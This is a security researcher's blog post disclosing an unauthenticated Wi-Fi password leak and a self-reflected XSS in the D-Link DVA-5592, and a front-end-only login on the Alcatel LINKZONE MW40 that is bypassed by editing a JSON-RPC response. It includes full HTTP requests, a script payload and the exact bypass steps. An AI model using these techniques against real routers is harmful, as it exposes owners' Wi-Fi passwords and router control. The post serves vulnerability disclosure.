---
title: "D-Link DVA-5592 missing authentication check and Self XSS | Alcatel LINKZONE no authentication control whatsoever"
tags:
- Wi-Fi
- dribble
- cache-poison
- wifi
- dlink
- d-link
- dva-5592
- alcatel
- LINKZONE
- MW40-V-V1
- vulnerabilities
- disclosure
date: 01-05-2019
---

<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5c76e0c5b9b4008b"></script>
<div class="addthis_inline_share_toolbox"></div>


**DISCLAIMER:** The author is not responsible for the misuse of the information contained in this post.

This is a long-overdue post describing some vulnerabilities that I found while working on [project Dribble](/2018/10/25/dribble-stealing-wifi-password-via-browsers-cache-poisoning/). Let me start by giving a very brief context so that you'll be able to follow this post without needing to know all the details of Dribble. The basic idea behind Dribble is to cache JavaScript code in the victim's browser while connected to a rouge access point. When the victim gets home, the cached JavaScript code will try to access the victim's router in order to retrieve the Wi-Fi password. Dribble thus brute-forces the login page of the web interface of the victim's router. In order to implement the brute-forcer, I had to investigate the login process of the routers I had at my disposal. At first, I had access only to my personal router, the D-Link DVA-5592, than I could also get my hands on the Alcatel Linkzone MW40-V-V1.0 which was given to me by my ISP along with a SIM card. Incredibly enough, both routers present some kind of authentication bypass thus not properly verifying that the user is logged in before providing sensitive information such as the Wi-Fi password. Let's get into it.


<style>
@font-face {
  font-family: "Harry";
  src: url(/fonts/hp.ttf) format("truetype");
}
</style>

## D-Link DVA-5592 Missing authentication control
The Dlink DVA-5592 shows a status page right after logging in. This page contains, as shown below, sensitive information such as the password of the Wi-Fi.

![](/images/status.png)

The URL for the status page is http://192.168.X.X/ui/status/ and if one tries to access it without being logged in, they are redirected to the login page. The status page, as you might have noticed, has a language button in the up-right corner that, surprise surprise, is used to change the language of the interface. Selecting a different language causes a request been performed to the following URL: `http://192.168.X.X/ui/status/content?lang=YY` See the `content` path right after `status`? The response obtained from requesting that URL contains the text in the selected language along with sensitive information I carefully redacted in the screen-shot above. Whenever I see the possibility of accessing the same information from different URLs, I automatically check if these URLs properly verify that the request is authenticated.
Turns out that if you request `http://192.168.X.X/ui/status/content`, the router's web interface does not check the session cookie, meaning that Dribble, or anybody else connected to the router, does not even need to brute-force the login page to have access to the Wi-Fi password.


![](/images/status-content.png)

<iframe src="https://giphy.com/embed/l41Ywr3dQBOujzU7m" width="100%" height="360" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/l41Ywr3dQBOujzU7m">via GIPHY</a></p>

This is particularly interesting not only for Dribble, but also in a scenario where the DVA-5592 is configured to have a guest Wi-Fi network with hosts isolation enabled. Users connected to the guest Wi-Fi can easily retrieve the password for the "main" Wi-Fi network and have unauthorized access to it.

## D-Link DVA-5592 Self Reflected Cross-Site Scripting
Nothing really special here. While playing with the D-Link DVA-5592 I thought about messing around a little with some parameters to see if I could find something else. It turns out that some parameters are vulnerable to Reflected Cross-Site Scripting. It also turns out that there's a parameter called `action__key` which acts as a Cross-Site Request Forgery token which makes the Reflected Cross-Site Scripting to fall into the "Self" category. The issue is spread throughout the all web interface and gets triggered whenever an input generates an error and the same input is reflected in the same form along with the error message.

Here I show an example of the vulnerability in the page used to create a new user for accessing a shared folder. If the username is something like `a"><script>alert('xss');</script>`, the web interface generates an error and reflects back the value of the username in the input form.


```
POST /ui/dboard/storage/storageusers/addstorageusers HTTP/1.1
Host: 192.168.100.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.100.1/ui/dboard/storage/storageusers/addstorageusers
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Connection: close
Cookie: sid=8838526573981467247
Upgrade-Insecure-Requests: 1

enable=true&username=az%5C&password=a%22%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E&passwordShow=on&action__key=1587374836_1442851124&apply=Applica

```

In the response you can see the payload being reflected.
```
HTTP/1.1 200 OK
Date: Thu, 24 Jan 2019 11:19:25 UTC
Server: HTTP Server
X-Frame-Options: DENY
Connection: close
Content-Language: en
Content-Type: text/html
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Content-Length: 6829


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
[...]
	<title>Residential Gateway - D-Link</title>
	

[...]
<div class="formField" id="password">
	<label for="password">Password:</label>
	<div class="passwordField">

<input type="password" autocomplete="off" name="password" value="a"><script>alert('xss');</script>" autocomplete='off'/>
<span class='text' style='visibility:hidden'><input type='checkbox' name='passwordShow' tabindex='-1'/> mostra password</span>
<script>
fieldPassword('password', 'passwordShow', 1, 0);
</script>

	</div>
</div>
<div class="formField">
<label>Seleziona Gruppi:</label>
<span class='texterror'>Groups not configured</span>
</div>

</fieldset>

<div class="buttons">
[...]
```
Which ultimately shows the canonical alert box.

![](/images/dlink-xss.png)

<iframe src="https://giphy.com/embed/12NUbkX6p4xOO4" width="100%" height="440" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/shia-labeouf-12NUbkX6p4xOO4">via GIPHY</a></p>


## Alcatel LINKZONE MW40-V-V1.0 authentication control so much not implemented
This issue was the one that made me chuckle, a complete authentication bypass of the web interface of the Alcatel LINKZONE MW40-V-V1.0.  Just a quick recap: I was looking into the login process of the Alcatel LINKZONE MW40-V-V1.0 to implement a brute-forcer to include in Dribble. First of, the web interface of the Alcatel LINKZONE MW40-V-V1.0, by default, is not password protected.


<iframe src="https://giphy.com/embed/NvgkEvycaWhPi" width="100%" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/mrw-rub-softcore-NvgkEvycaWhPi">via GIPHY</a></p>

This already makes it easy in case you're targeting the average user but, of course, I wanted to make sure that the whole thing could work also when the user had setup a password. Once I started to analyze the HTTP traffic, I soon learnt that the front-end uses the JSON-RPC standard to communicate with the back-end. The whole front-end is downloaded the first time you visit the web interface and after that all the info related to the status of the router are retrieved with JSON-RPC calls. All I needed was to find the request that accessed the Wi-Fi password, and soon enough I found it to be this one:

```
POST http://192.168.1.1/jrd/webapi HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.1.1/index.html
_TclRequestVerificationToken: bf16bgno22;1Y[QZ
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 65
Connection: keep-alive
Host: 192.168.1.1

{"jsonrpc":"2.0","method":"GetWlanSettings","params":{},"id":"1"}
```

Nice, the value for `_TclRequestVeerificationToken` seems to be some sort of verification token, so now what I need is to find out how that token is generated.
However, before I could even start looking into it, another request caught my attention:

```
POST http://192.168.1.1/jrd/webapi HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.1.1/index.html
_TclRequestVerificationToken: bf16bgno22;1Y[QZ
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 63
Connection: keep-alive
Host: 192.168.1.1

{"jsonrpc":"2.0","method":"GetLoginState","params":{},"id":"1"}
```

This request is generated whenever I want to perform any action prior to the login and already contains the `_TclRequestVerificationToken` ...  weird. That `GetLoginState` also seems interesting, and the response contains even more interesting stuff.


```
HTTP/1.1 200 OK
Content-Type: application/json
X-Frame-Options: SAMEORIGIN
x-xss-protection: 1; mode=block
Content-Length: 109

{ "jsonrpc": "2.0", "result": { "State": 0, "LoginRemainingTimes": 3, "LockedRemainingTime": 0 }, "id": "1" }
```

You are telling me that the front-end is asking `GetLoginState`, the request already contains the value for `_TclRequestVerificationToken` without being logged in, and the back-end is answering with `"State": 0` ...


<iframe src="https://giphy.com/embed/i8sfZdOmWUuCQ" width="100%" height="392" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/funny-kim-kardashian-kanye-west-i8sfZdOmWUuCQ">via GIPHY</a></p>


The front-end is simply "blocking" what are suppose to be unauthenticated users from viewing the content of the web interface. All one needs to do is intercepting the response to the `GetLoginState` request and change the value of `State` from `0` to `1` and voilà... you are now logged in.

## Disclosure
This is the main reason why this post comes so late. Here's the deal: I contacted Alcatel to notify the vulnerability, but Alcatel doesn't seem to have a security response team. I figured I would give a try with the "general" support team. They answered pretty fast but they couldn't really understand what I was trying to tell them. I thus shot a short video showing that it was possible to have access to the router without knowing the password. They finally told me that they would look into it but there wouldn't be any further communication from their side.

D-Link, on the other hand, does have a Security Incident Report Team. I contacted them and provided all the details of the two issues and they told me to ask for the CVEs myself and that they would contact me after looking into the issues. They also said it shouldn't take longer than a few days. Over a month and three e-mails later ... still no news from their side.

So what about the CVEs then? CVEs are like Pokémon gym badges, <a href="https://bulbapedia.bulbagarden.net/wiki/Obedience#Badges">the more you have the more Pokémon will respect you</a> ...

<iframe src="https://giphy.com/embed/wrBURfbZmqqXu" width="100%" height="319" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/reaction-wrBURfbZmqqXu">via GIPHY</a></p>


I asked for CVEs ... a couple of months ago or so and still no news so ...

<iframe src="https://giphy.com/embed/wfKvNRrQWEdDW" width="100%" height="211" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p style="text-align:center;font-size:0.7em"><a href="https://giphy.com/gifs/incredibles-2-reaction-gifs-d23-expo-wfKvNRrQWEdDW">via GIPHY</a></p>

(OK, the CVEs have been allocated, of course, but are still in the **RESERVED** state.)

## Wrapping up
While looking for ways to easily get the Wi-Fi password from the only two routers I have constant access to (a D-Link DVA-5592 and an Alcatel LINKZONE), I discovered that both do not correctly implement an authentication mechanism. For the D-Link this is "limited" to a status page which also contains the password of the Wi-Fi in clear text. The Alcatel, on the other hand, lacks of proper authentication entirely which results in a complete takeover of the web interface.

I am very happy I finally managed to find the time to implement Dribble, not only because it was in my TO-DO list for a very long time and I could finally scratch it off (I really like to scratch things off), but also because working on it resulted in some collateral findings, which I believe to be a very satisfying way to discover something new.

<div style="text-align:center;font-family:Harry;font-size:5em">mischief managed</div>

